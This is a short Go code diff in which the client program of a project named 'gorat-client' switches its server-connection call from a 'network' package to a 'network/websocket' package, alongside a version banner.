@@ -4,7 +4,7 @@ import (
 	"fmt"
 
 	"github.com/viher3/gorat-client/config"
-	"github.com/viher3/gorat-client/network"
+	"github.com/viher3/gorat-client/network/websocket"
 )
 
 func main() {
@@ -13,5 +13,5 @@ func main() {
 	fmt.Println("### goRat client v"+conf.Version, "###")
 	fmt.Println("############################")
 
-	network.ConnectToServer(conf)
+	websocket.ConnectToServer(conf)
 }
